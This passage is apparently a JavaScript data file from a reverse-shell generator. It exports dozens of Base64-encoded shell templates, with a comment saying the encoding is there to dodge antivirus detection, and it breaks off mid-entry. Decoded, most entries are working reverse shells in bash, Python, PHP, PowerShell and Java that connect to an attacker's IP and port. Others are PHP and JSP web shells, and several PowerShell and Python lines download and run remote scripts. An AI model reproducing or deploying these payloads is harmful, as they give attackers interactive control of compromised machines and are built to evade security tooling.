// Payloads are Base64 encoded in source to prevent AV flagging during dev.
// The app decodes them, then applies user-selected obfuscation.

export const shells = [
  {
    "id": "bash-i-0",
    "name": "Bash -i",
    "os": "linux",
    "language": "bash",
    "tags": [
      "standard",
      "stable"
    ],
    "template": "YmFzaCAtaSA+JiAvZGV2L3RjcC97aXB9L3twb3J0fSAwPiYx",
    "description": "Standard Bash reverse shell."
  },
  {
    "id": "bash-196-1",
    "name": "Bash 196",
    "os": "linux",
    "language": "bash",
    "tags": [
      "bypass",
      "fd"
    ],
    "template": "MDwmMTk2O2V4ZWMgMTk2PD4vZGV2L3RjcC97aXB9L3twb3J0fTsgc2ggPCYxOTYgPiYxOTYgMj4mMTk2",
    "description": "Bash reverse shell using file descriptor 196."
  },
  {
    "id": "bash-udp-2",
    "name": "Bash UDP",
    "os": "linux",
    "language": "bash",
    "tags": [
      "bypass",
      "udp"
    ],
    "template": "c2ggLWkgPiYgL2Rldi91ZHAve2lwfS97cG9ydH0gMD4mMQ==",
    "description": "Bash reverse shell using UDP."
  },
  {
    "id": "bash-read-line-3",
    "name": "Bash Read Line",
    "os": "linux",
    "language": "bash",
    "tags": [
      "bypass"
    ],
    "template": "ZXhlYyA1PD4vZGV2L3RjcC97aXB9L3twb3J0fTtjYXQgPCY1IHwgd2hpbGUgcmVhZCBsaW5lOyBkbyAkbGluZSAyPiY1ID4mNTsgZG9uZQ==",
    "description": "Bash reverse shell using read line loop."
  },
  {
    "id": "bash-5-4",
    "name": "Bash 5",
    "os": "linux",
    "language": "bash",
    "tags": [
      "bypass",
      "fd"
    ],
    "template": "YmFzaCAtaSA1PD4vZGV2L3RjcC97aXB9L3twb3J0fSAwPCY1IDE+JjUgMj4mNQ==",
    "description": "Bash reverse shell using FD 5."
  },
  {
    "id": "bash-2025-5",
    "name": "Bash 2025",
    "os": "linux",
    "language": "bash",
    "tags": [
      "modern",
      "fd"
    ],
    "template": "YmFzaCAtaSAyMDI1PD4vZGV2L3RjcC97aXB9L3twb3J0fSAwPCYyMDI1IDE+JjIwMjUgMj4mMjAyNQ==",
    "description": "Bash reverse shell using FD 2025."
  },
  {
    "id": "bash-no-space-6",
    "name": "Bash No Space",
    "os": "linux",
    "language": "bash",
    "tags": [
      "bypass",
      "obfuscation"
    ],
    "template": "e2Jhc2gsLWl9PiYvZGV2L3RjcC97aXB9L3twb3J0fSAwPiYx",
    "description": "Bash reverse shell without spaces (brace expansion)."
  },
  {
    "id": "bash-base64-7",
    "name": "Bash Base64",
    "os": "linux",
    "language": "bash",
    "tags": [
      "bypass",
      "encoded"
    ],
    "template": "ZWNobyB7YmFzZTY0X3BheWxvYWR9IHwgYmFzZTY0IC1kIHwgYmFzaA==",
    "description": "Base64 encoded Bash shell (auto-generated)."
  },
  {
    "id": "bash-dev-tcp-8",
    "name": "Bash /dev/tcp",
    "os": "linux",
    "language": "bash",
    "tags": [
      "standard"
    ],
    "template": "L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3Ave2lwfS97cG9ydH0gMD4mMSI=",
    "description": "Explicit /bin/bash call."
  },
  {
    "id": "bash-zsh-fallback-9",
    "name": "Bash Zsh Fallback",
    "os": "linux",
    "language": "bash",
    "tags": [
      "fallback"
    ],
    "template": "KGJhc2ggLWkgPiYgL2Rldi90Y3Ave2lwfS97cG9ydH0gMD4mMSkgfHwgKHpzaCAtYyAiem1vZGxvYWQgenNoL25ldC90Y3AgJiYgenRjcCB7aXB9IHtwb3J0fSAmJiB6c2ggPiYkUkVQTFkgMj4mJFJFUExZIDA+JiRSRVBMWSIp",
    "description": "Tries Bash, falls back to Zsh."
  },
  {
    "id": "bash-nohup-10",
    "name": "Bash Nohup",
    "os": "linux",
    "language": "bash",
    "tags": [
      "persistence"
    ],
    "template": "bm9odXAgYmFzaCAtaSA+JiAvZGV2L3RjcC97aXB9L3twb3J0fSAwPiYxICY=",
    "description": "Nohup background shell."
  },
  {
    "id": "bash-trap-11",
    "name": "Bash Trap",
    "os": "linux",
    "language": "bash",
    "tags": [
      "bypass"
    ],
    "template": "dHJhcCAiIiBIVVA7IGJhc2ggLWkgPiYgL2Rldi90Y3Ave2lwfS97cG9ydH0gMD4mMQ==",
    "description": "Traps HUP signal."
  },
  {
    "id": "bash-arithmetic-12",
    "name": "Bash Arithmetic",
    "os": "linux",
    "language": "bash",
    "tags": [
      "obfuscation"
    ],
    "template": "YmFzaCAtaSA+JiAvZGV2L3RjcC97aXB9LyQoKCB7cG9ydH0gKyAwICkpIDA+JjE=",
    "description": "Arithmetic expansion for port."
  },
  {
    "id": "bash-variable-13",
    "name": "Bash Variable",
    "os": "linux",
    "language": "bash",
    "tags": [
      "obfuscation"
    ],
    "template": "SVA9e2lwfTtQT1JUPXtwb3J0fTtiYXNoIC1pID4mIC9kZXYvdGNwLyRJUC8kUE9SVCAwPiYx",
    "description": "Using variables."
  },
  {
    "id": "bash-ifs-14",
    "name": "Bash IFS",
    "os": "linux",
    "language": "bash",
    "tags": [
      "obfuscation"
    ],
    "template": "SUZTPSw7SVA9e2lwfTtQT1JUPXtwb3J0fTtiYXNoIC1pID4mIC9kZXYvdGNwLyRJUC8kUE9SVCAwPiYx",
    "description": "IFS manipulation."
  },
  {
    "id": "telnet-mkfifo-15",
    "name": "Telnet mkfifo",
    "os": "linux",
    "language": "bash",
    "tags": [
      "legacy",
      "telnet"
    ],
    "template": "cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8dGVsbmV0IHtpcH0ge3BvcnR9ID4vdG1wL2Y=",
    "description": "Telnet mkfifo."
  },
  {
    "id": "python-socket-16",
    "name": "Python Socket",
    "os": "linux",
    "language": "python",
    "tags": [
      "standard"
    ],
    "template": "cHl0aG9uIC1jICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgie2lwfSIse3BvcnR9KSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7IG9zLmR1cDIocy5maWxlbm8oKSwyKTtwPXN1YnByb2Nlc3MuY2FsbChbIi9iaW4vc2giLCItaSJdKTsn",
    "description": "Standard Python socket."
  },
  {
    "id": "python3-socket-17",
    "name": "Python3 Socket",
    "os": "linux",
    "language": "python",
    "tags": [
      "standard",
      "python3"
    ],
    "template": "cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIntpcH0iLHtwb3J0fSkpO29zLmR1cDIocy5maWxlbm8oKSwwKTsgb3MuZHVwMihzLmZpbGVubygpLDEpOyBvcy5kdXAyKHMuZmlsZW5vKCksMik7cD1zdWJwcm9jZXNzLmNhbGwoWyIvYmluL3NoIiwiLWkiXSk7Jw==",
    "description": "Standard Python3 socket."
  },
  {
    "id": "python-short-18",
    "name": "Python Short",
    "os": "linux",
    "language": "python",
    "tags": [
      "short"
    ],
    "template": "cHl0aG9uIC1jICdpbXBvcnQgb3Msc3lzLHNvY2tldDtzeXMuc3RkZXJyPXN5cy5zdGRvdXQ9cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KCgie2lwfSIse3BvcnR9KSk7b3MuZHVwMihzLmZpbGVubygpLDApO29zLmV4ZWN2KCIvYmluL3NoIixbIi1pIl0pJw==",
    "description": "Short Python shell."
  },
  {
    "id": "python-ipv6-19",
    "name": "Python IPv6",
    "os": "linux",
    "language": "python",
    "tags": [
      "ipv6"
    ],
    "template": "cHl0aG9uIC1jICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVUNixzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIntpcH0iLHtwb3J0fSwwLDApKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTsgb3MuZHVwMihzLmZpbGVubygpLDIpO3A9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pOyc=",
    "description": "Python IPv6 shell."
  },
  {
    "id": "python-pty-20",
    "name": "Python PTY",
    "os": "linux",
    "language": "python",
    "tags": [
      "stable"
    ],
    "template": "cHl0aG9uIC1jICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3MscHR5O3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIntpcH0iLHtwb3J0fSkpO29zLmR1cDIocy5maWxlbm8oKSwwKTsgb3MuZHVwMihzLmZpbGVubygpLDEpOyBvcy5kdXAyKHMuZmlsZW5vKCksMik7cHR5LnNwYXduKCIvYmluL3NoIik7Jw==",
    "description": "Python PTY shell."
  },
  {
    "id": "python-subprocess-21",
    "name": "Python Subprocess",
    "os": "linux",
    "language": "python",
    "tags": [
      "modern"
    ],
    "template": "cHl0aG9uIC1jICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgie2lwfSIse3BvcnR9KSk7c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0sc3RkaW49cy5maWxlbm8oKSxzdGRvdXQ9cy5maWxlbm8oKSxzdGRlcnI9cy5maWxlbm8oKSkn",
    "description": "Python using subprocess direct mapping."
  },
  {
    "id": "python-windows-22",
    "name": "Python Windows",
    "os": "windows",
    "language": "python",
    "tags": [
      "windows"
    ],
    "template": "cHl0aG9uIC1jICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgie2lwfSIse3BvcnR9KSk7c3VicHJvY2Vzcy5jYWxsKFsiY21kLmV4ZSJdLHN0ZGluPXMuZmlsZW5vKCksc3Rkb3V0PXMuZmlsZW5vKCksc3RkZXJyPXMuZmlsZW5vKCkpJw==",
    "description": "Python for Windows."
  },
  {
    "id": "python3-windows-23",
    "name": "Python3 Windows",
    "os": "windows",
    "language": "python",
    "tags": [
      "windows",
      "python3"
    ],
    "template": "cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIntpcH0iLHtwb3J0fSkpO3N1YnByb2Nlc3MuY2FsbChbImNtZC5leGUiXSxzdGRpbj1zLmZpbGVubygpLHN0ZG91dD1zLmZpbGVubygpLHN0ZGVycj1zLmZpbGVubygpKSc=",
    "description": "Python3 for Windows."
  },
  {
    "id": "python-base64-24",
    "name": "Python Base64",
    "os": "linux",
    "language": "python",
    "tags": [
      "obfuscated"
    ],
    "template": "cHl0aG9uIC1jICJleGVjKF9faW1wb3J0X18oJ2Jhc2U2NCcpLmI2NGRlY29kZSh7YmFzZTY0X3BheWxvYWR9KSki",
    "description": "Python executing Base64 payload (placeholder)."
  },
  {
    "id": "python-os-system-25",
    "name": "Python OS System",
    "os": "linux",
    "language": "python",
    "tags": [
      "simple"
    ],
    "template": "cHl0aG9uIC1jICdpbXBvcnQgb3M7IG9zLnN5c3RlbSgibmMgLWUgL2Jpbi9zaCB7aXB9IHtwb3J0fSIpJw==",
    "description": "Python calling OS system nc."
  },
  {
    "id": "python-inline-26",
    "name": "Python Inline",
    "os": "linux",
    "language": "python",
    "tags": [
      "inline"
    ],
    "template": "ZXhwb3J0IFJIT1NUPSJ7aXB9IjtleHBvcnQgUlBPUlQ9e3BvcnR9O3B5dGhvbiAtYyAnaW1wb3J0IHN5cyxzb2NrZXQsb3MscHR5O3M9c29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgob3MuZ2V0ZW52KCJSSE9TVCIpLGludChvcy5nZXRlbnYoIlJQT1JUIikpKSk7W29zLmR1cDIocy5maWxlbm8oKSxmZCkgZm9yIGZkIGluICgwLDEsMildO3B0eS5zcGF3bigiL2Jpbi9zaCIpJw==",
    "description": "Python using env vars."
  },
  {
    "id": "python-urllib-27",
    "name": "Python Urllib",
    "os": "linux",
    "language": "python",
    "tags": [
      "web"
    ],
    "template": "cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliOyBleGVjKHVybGxpYi51cmxvcGVuKCJodHRwOi8ve2lwfTp7c2VydmVyX3BvcnR9L3NoZWxsLnB5IikucmVhZCgpKSc=",
    "description": "Python downloading and executing shell."
  },
  {
    "id": "php-exec-28",
    "name": "PHP Exec",
    "os": "linux",
    "language": "php",
    "tags": [
      "standard"
    ],
    "template": "cGhwIC1yICckc29jaz1mc29ja29wZW4oIntpcH0iLHtwb3J0fSk7ZXhlYygiL2Jpbi9zaCAtaSA8JjMgPiYzIDI+JjMiKTsn",
    "description": "PHP exec."
  },
  {
    "id": "php-shell-exec-29",
    "name": "PHP Shell Exec",
    "os": "linux",
    "language": "php",
    "tags": [
      "standard"
    ],
    "template": "cGhwIC1yICckc29jaz1mc29ja29wZW4oIntpcH0iLHtwb3J0fSk7c2hlbGxfZXhlYygiL2Jpbi9zaCAtaSA8JjMgPiYzIDI+JjMiKTsn",
    "description": "PHP shell_exec."
  },
  {
    "id": "php-system-30",
    "name": "PHP System",
    "os": "linux",
    "language": "php",
    "tags": [
      "standard"
    ],
    "template": "cGhwIC1yICckc29jaz1mc29ja29wZW4oIntpcH0iLHtwb3J0fSk7c3lzdGVtKCIvYmluL3NoIC1pIDwmMyA+JjMgMj4mMyIpOyc=",
    "description": "PHP system."
  },
  {
    "id": "php-passthru-31",
    "name": "PHP Passthru",
    "os": "linux",
    "language": "php",
    "tags": [
      "standard"
    ],
    "template": "cGhwIC1yICckc29jaz1mc29ja29wZW4oIntpcH0iLHtwb3J0fSk7cGFzc3RocnUoIi9iaW4vc2ggLWkgPCYzID4mMyAyPiYzIik7Jw==",
    "description": "PHP passthru."
  },
  {
    "id": "php-popen-32",
    "name": "PHP Popen",
    "os": "linux",
    "language": "php",
    "tags": [
      "standard"
    ],
    "template": "cGhwIC1yICckc29jaz1mc29ja29wZW4oIntpcH0iLHtwb3J0fSk7cG9wZW4oIi9iaW4vc2ggLWkgPCYzID4mMyAyPiYzIiwgInIiKTsn",
    "description": "PHP popen."
  },
  {
    "id": "php-proc-open-33",
    "name": "PHP Proc Open",
    "os": "linux",
    "language": "php",
    "tags": [
      "modern"
    ],
    "template": "cGhwIC1yICckc29jaz1mc29ja29wZW4oIntpcH0iLHtwb3J0fSk7JHByb2M9cHJvY19vcGVuKCIvYmluL3NoIC1pIiwgYXJyYXkoMD0+JHNvY2ssIDE9PiRzb2NrLCAyPT4kc29jayksJHBpcGVzKTsn",
    "description": "PHP proc_open."
  },
  {
    "id": "php-backticks-34",
    "name": "PHP Backticks",
    "os": "linux",
    "language": "php",
    "tags": [
      "short"
    ],
    "template": "cGhwIC1yICckc29jaz1mc29ja29wZW4oIntpcH0iLHtwb3J0fSk7YC9iaW4vc2ggLWkgPCYzID4mMyAyPiYzYDsn",
    "description": "PHP backticks."
  },
  {
    "id": "php-windows-35",
    "name": "PHP Windows",
    "os": "windows",
    "language": "php",
    "tags": [
      "windows"
    ],
    "template": "cGhwIC1yICckc29jaz1mc29ja29wZW4oIntpcH0iLHtwb3J0fSk7ZXhlYygiY21kLmV4ZSA8JjMgPiYzIDI+JjMiKTsn",
    "description": "PHP for Windows."
  },
  {
    "id": "php-one-liner-web-36",
    "name": "PHP One-Liner Web",
    "os": "linux",
    "language": "php",
    "tags": [
      "web"
    ],
    "template": "PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+",
    "description": "Simple PHP web shell."
  },
  {
    "id": "php-cmd-37",
    "name": "PHP Cmd",
    "os": "linux",
    "language": "php",
    "tags": [
      "web"
    ],
    "template": "PD9waHAgaWYoaXNzZXQoJF9SRVFVRVNUWydjbWQnXSkpeyBlY2hvICI8cHJlPiI7ICRjbWQgPSAoJF9SRVFVRVNUWydjbWQnXSk7IHN5c3RlbSgkY21kKTsgZWNobyAiPC9wcmU+IjsgZGllOyB9Pz4=",
    "description": "Interactive PHP web shell."
  },
  {
    "id": "powershell-tcp-38",
    "name": "PowerShell TCP",
    "os": "windows",
    "language": "powershell",
    "tags": [
      "standard"
    ],
    "template": "JGNsaWVudCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5Tb2NrZXRzLlRjcENsaWVudCgne2lwfScse3BvcnR9KTskc3RyZWFtID0gJGNsaWVudC5HZXRTdHJlYW0oKTtbYnl0ZVtdXSRieXRlcyA9IDAuLjY1NTM1fCV7MH07d2hpbGUoKCRpID0gJHN0cmVhbS5SZWFkKCRieXRlcywgMCwgJGJ5dGVzLkxlbmd0aCkpIC1uZSAwKXs7JGRhdGEgPSAoTmV3LU9iamVjdCAtVHlwZU5hbWUgU3lzdGVtLlRleHQuQVNDSUlFbmNvZGluZykuR2V0U3RyaW5nKCRieXRlcywwLCAkaSk7JHNlbmRiYWNrID0gKGlleCAkZGF0YSAyPiYxIHwgT3V0LVN0cmluZyApOyRzZW5kYmFjazIgPSAkc2VuZGJhY2sgKyAnUFMgJyArIChwd2QpLlBhdGggKyAnPiAnOyRzZW5kYnl0ZSA9IChbdGV4dC5lbmNvZGluZ106OkFTQ0lJKS5HZXRCeXRlcygkc2VuZGJhY2syKTskc3RyZWFtLldyaXRlKCRzZW5kYnl0ZSwwLCRzZW5kYnl0ZS5MZW5ndGgpOyRzdHJlYW0uRmx1c2goKX07JGNsaWVudC5DbG9zZSgp",
    "description": "Standard TCP Client."
  },
  {
    "id": "powershell-iex-39",
    "name": "PowerShell IEX",
    "os": "windows",
    "language": "powershell",
    "tags": [
      "bypass"
    ],
    "template": "cG93ZXJzaGVsbCAtbm9wIC1jICIkY2xpZW50ID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LlNvY2tldHMuVGNwQ2xpZW50KCd7aXB9Jyx7cG9ydH0pOyRzdHJlYW0gPSAkY2xpZW50LkdldFN0cmVhbSgpO1tieXRlW11dJGJ5dGVzID0gMC4uNjU1MzV8JXswfTt3aGlsZSgoJGkgPSAkc3RyZWFtLlJlYWQoJGJ5dGVzLCAwLCAkYnl0ZXMuTGVuZ3RoKSkgLW5lIDApezskZGF0YSA9IChOZXctT2JqZWN0IC1UeXBlTmFtZSBTeXN0ZW0uVGV4dC5BU0NJSUVuY29kaW5nKS5HZXRTdHJpbmcoJGJ5dGVzLDAsICRpKTskc2VuZGJhY2sgPSAoaWV4ICRkYXRhIDI+JjEgfCBPdXQtU3RyaW5nICk7JHNlbmRiYWNrMiA9ICRzZW5kYmFjayArICdQUyAnICsgKHB3ZCkuUGF0aCArICc+ICc7JHNlbmRieXRlID0gKFt0ZXh0LmVuY29kaW5nXTo6QVNDSUkpLkdldEJ5dGVzKCRzZW5kYmFjazIpOyRzdHJlYW0uV3JpdGUoJHNlbmRieXRlLDAsJHNlbmRieXRlLkxlbmd0aCk7JHN0cmVhbS5GbHVzaCgpfTskY2xpZW50LkNsb3NlKCki",
    "description": "One-liner IEX."
  },
  {
    "id": "powershell-nishang-40",
    "name": "PowerShell Nishang",
    "os": "windows",
    "language": "powershell",
    "tags": [
      "bypass",
      "download"
    ],
    "template": "SUVYKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly97aXB9OntzZXJ2ZXJfcG9ydH0vc2hlbGwucHMxJyk=",
    "description": "Nishang download."
  },
  {
    "id": "powershell-conpty-41",
    "name": "PowerShell ConPty",
    "os": "windows",
    "language": "powershell",
    "tags": [
      "modern"
    ],
    "template": "SUVYKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9hbnRvbmlvQ29jby9Db25QdHlTaGVsbC9tYXN0ZXIvSW52b2tlLUNvblB0eVNoZWxsLnBzMScpOyBJbnZva2UtQ29uUHR5U2hlbGwge2lwfSB7cG9ydH0=",
    "description": "ConPty interactive shell."
  },
  {
    "id": "powershell-powercat-42",
    "name": "PowerShell PowerCat",
    "os": "windows",
    "language": "powershell",
    "tags": [
      "tool"
    ],
    "template": "SUVYKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9iZXNpbW9yaGluby9wb3dlcmNhdC9tYXN0ZXIvcG93ZXJjYXQucHMxJyk7IHBvd2VyY2F0IC1jIHtpcH0gLXAge3BvcnR9IC1lIGNtZA==",
    "description": "PowerCat."
  },
  {
    "id": "powershell-base64-43",
    "name": "PowerShell Base64",
    "os": "windows",
    "language": "powershell",
    "tags": [
      "obfuscated"
    ],
    "template": "cG93ZXJzaGVsbCAtZSB7YmFzZTY0X3BheWxvYWR9",
    "description": "Base64 encoded PowerShell (placeholder)."
  },
  {
    "id": "powershell-udp-44",
    "name": "PowerShell UDP",
    "os": "windows",
    "language": "powershell",
    "tags": [
      "bypass",
      "udp"
    ],
    "template": "JHU9TmV3LU9iamVjdCBTeXN0ZW0uTmV0LlNvY2tldHMuVWRwQ2xpZW50OyAkdS5Db25uZWN0KCd7aXB9Jyx7cG9ydH0pOyAkcD1uZXctb2JqZWN0IHN5c3RlbS50ZXh0LmFzY2lpZW5jb2Rpbmc7ICRiPSRwLkdldEJ5dGVzKCdQUyAnKyhwd2QpLnBhdGgrJz4gJyk7ICR1LlNlbmQoJGIsJGIubGVuZ3RoKTsgd2hpbGUoJHRydWUpeyRyPSR1LlJlY2VpdmUoW3JlZl0obmV3LW9iamVjdCBTeXN0ZW0uTmV0LklQRW5kUG9pbnQoMCwwKSkpOyAkcz0kcC5HZXRTdHJpbmcoJHIpOyAkcj0oW3RleHQuZW5jb2RpbmddOjpBU0NJSSkuR2V0Qnl0ZXMoKGlleCAkcyAyPiYxIHwgT3V0LVN0cmluZykpOyAkdS5TZW5kKCRyLCRyLmxlbmd0aCl9",
    "description": "UDP Client."
  },
  {
    "id": "powershell-tls-45",
    "name": "PowerShell TLS",
    "os": "windows",
    "language": "powershell",
    "tags": [
      "encrypted"
    ],
    "template": "W05ldC5TZXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VjdXJpdHlQcm90b2NvbCA9IFtOZXQuU2VjdXJpdHlQcm90b2NvbFR5cGVdOjpUbHMxMjsgJGNsaWVudCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5Tb2NrZXRzLlRjcENsaWVudCgne2lwfScse3BvcnR9KTsgLi4u",
    "description": "TLS forced PowerShell."
  },
  {
    "id": "powershell-mini-46",
    "name": "PowerShell Mini",
    "os": "windows",
    "language": "powershell",
    "tags": [
      "short"
    ],
    "template": "JHM9TmV3LU9iamVjdCBJTy5NZW1vcnlTdHJlYW0oLFtDb252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygiLi4uIikpO0lFWCAoTmV3LU9iamVjdCBJTy5TdHJlYW1SZWFkZXIoTmV3LU9iamVjdCBJTy5Db21wcmVzc2lvbi5HemlwU3RyZWFtKCRzLFtJTy5Db21wcmVzc2lvbi5Db21wcmVzc2lvbk1vZGVdOjpEZWNvbXByZXNzKSkpLlJlYWRUb0VuZCgp",
    "description": "Miniaturized/Compressed payload."
  },
  {
    "id": "powershell-bind-47",
    "name": "PowerShell Bind",
    "os": "windows",
    "language": "powershell",
    "tags": [
      "bind"
    ],
    "template": "YmluZCBzaGVsbCBsb2dpYyBoZXJlLi4u",
    "description": "Bind shell (placeholder)."
  },
  {
    "id": "powershell-reverse-dns-48",
    "name": "PowerShell Reverse DNS",
    "os": "windows",
    "language": "powershell",
    "tags": [
      "bypass",
      "dns"
    ],
    "template": "ZG5zY2F0MiBsb2dpYy4uLg==",
    "description": "DNS tunneling (placeholder)."
  },
  {
    "id": "powershell-empire-49",
    "name": "PowerShell Empire",
    "os": "windows",
    "language": "powershell",
    "tags": [
      "framework"
    ],
    "template": "RW1waXJlIGxhdW5jaGVyLi4u",
    "description": "Empire stager."
  },
  {
    "id": "powershell-metasploit-50",
    "name": "PowerShell Metasploit",
    "os": "windows",
    "language": "powershell",
    "tags": [
      "framework"
    ],
    "template": "TWV0YXNwbG9pdCB3ZWJfZGVsaXZlcnkuLi4=",
    "description": "Metasploit stager."
  },
  {
    "id": "powershell-cobaltstrike-51",
    "name": "PowerShell CobaltStrike",
    "os": "windows",
    "language": "powershell",
    "tags": [
      "framework"
    ],
    "template": "Q29iYWx0U3RyaWtlIGJlYWNvbi4uLg==",
    "description": "CobaltStrike stager."
  },
  {
    "id": "powershell-ipv6-52",
    "name": "PowerShell IPv6",
    "os": "windows",
    "language": "powershell",
    "tags": [
      "ipv6"
    ],
    "template": "JGNsaWVudCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5Tb2NrZXRzLlRjcENsaWVudChbU3lzdGVtLk5ldC5JUEFkZHJlc3NdOjpQYXJzZSgne2lwfScpLHtwb3J0fSk7IC4uLg==",
    "description": "IPv6 TCP Client."
  },
  {
    "id": "java-processbuilder-53",
    "name": "Java ProcessBuilder",
    "os": "linux",
    "language": "java",
    "tags": [
      "standard"
    ],
    "template": "ciA9IFJ1bnRpbWUuZ2V0UnVudGltZSgpLmV4ZWMoIi9iaW4vYmFzaCAtYyBleGVjIDU8Pi9kZXYvdGNwL3tpcH0ve3BvcnR9OyBjYXQgPCY1IHwgd2hpbGUgcmVhZCBsaW5lOyBkbyAkbGluZSAyPiY1ID4mNTsgZG9uZSIsIG51bGwsIG51bGwpO3Iud2FpdEZvcigpOw==",
    "description": "Java ProcessBuilder."
  },
  {
    "id": "groovy-socket-54",
    "name": "Groovy Socket",
    "os": "linux",
    "language": "java",
    "tags": [
      "jenkins"
    ],
    "template": "U3RyaW5nIGhvc3Q9IntpcH0iO2ludCBwb3J0PXtwb3J0fTtTdHJpbmcgY21kPSJjbWQuZXhlIjtQcm9jZXNzIHA9bmV3IFByb2Nlc3NCdWlsZGVyKGNtZCkucmVkaXJlY3RFcnJvclN0cmVhbSh0cnVlKS5zdGFydCgpO1NvY2tldCBzPW5ldyBTb2NrZXQoaG9zdCxwb3J0KTtJbnB1dFN0cmVhbSBwaT1wLmdldElucHV0U3RyZWFtKCkscGU9cC5nZXRFcnJvclN0cmVhbSgpLCBzaT1zLmdldElucHV0U3RyZWFtKCk7T3V0cHV0U3RyZWFtIHBvPXAuZ2V0T3V0cHV0U3RyZWFtKCksc289cy5nZXRPdXRwdXRTdHJlYW0oKTt3aGlsZSghcy5pc0Nsb3NlZCgpKXt3aGlsZShwaS5hdmFpbGFibGUoKT4wKXNvLndyaXRlKHBpLnJlYWQoKSk7d2hpbGUocGUuYXZhaWxhYmxlKCk+MClzby53cml0ZShwZS5yZWFkKCkpO3doaWxlKHNpLmF2YWlsYWJsZSgpPjApcG8ud3JpdGUoc2kucmVhZCgpKTtzby5mbHVzaCgpO3BvLmZsdXNoKCk7VGhyZWFkLnNsZWVwKDUwKTt0cnkge3AuZXhpdFZhbHVlKCk7YnJlYWs7fWNhdGNoIChFeGNlcHRpb24gZSl7fX07cC5kZXN0cm95KCk7cy5jbG9zZSgpOw==",
    "description": "Groovy socket."
  },
  {
    "id": "java-war-55",
    "name": "Java WAR",
    "os": "linux",
    "language": "java",
    "tags": [
      "tomcat"
    ],
    "template": "bXNmdmVub20gLXAgamF2YS9qc3Bfc2hlbGxfcmV2ZXJzZV90Y3AgTEhPU1Q9e2lwfSBMUE9SVD17cG9ydH0gLWYgd2FyID4gc2hlbGwud2Fy",
    "description": "MSFVenom WAR."
  },
  {
    "id": "java-jsp-56",
    "name": "Java JSP",
    "os": "linux",
    "language": "java",
    "tags": [
      "web"
    ],
    "template": "PCUgUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYygiL2Jpbi9iYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwL3tpcH0ve3BvcnR9IDA+JjEnIik7ICU+",
    "description": "Simple JSP shell."
  },
  {
    "id": "java-socket-57",
    "name": "Java Socket",
    "os": "linux",
    "language": "java",
    "tags": [
      "standard"
    ],
    "template": "U29ja2V0IHMgPSBuZXcgU29ja2V0KCJ7aXB9Iiwge3BvcnR9KTsgUHJvY2VzcyBwID0gbmV3IFByb2Nlc3NCdWlsZGVyKCIvYmluL3NoIikucmVkaXJlY3RFcnJvclN0cmVhbSh0cnVlKS5zdGFydCgpOyAuLi4=",
    "description": "Raw Java Socket."
  },
  {
    "id": "java-runtime-58",
    "name": "Java Runtime",
    "os": "linux",
    "language": "java",
    "tags": [
      "standard"
    ],
    "template": "UnVudGltZS5nZXRSdW50aW1lKCkuZXhlYyhuZXcgU3RyaW5nW117Ii9iaW4vc2giLCItYyIsImV4ZWMgNTw+L2Rldi90Y3Ave2lwfS97cG9ydH07Y2F0IDwmNSB8IHdoaWxlIHJlYWQgbGluZTsgZG8gJGxpbmUgMj4mNSA+JjU7IGRvbmUifSk7",
    "description": "Runtime exec array."
  },
  {
    "id": "java-windows-59",
    "name": "Java Windows",
    "os": "windows",
    "language": "java",
    "tags": [
      "windows"
    ],
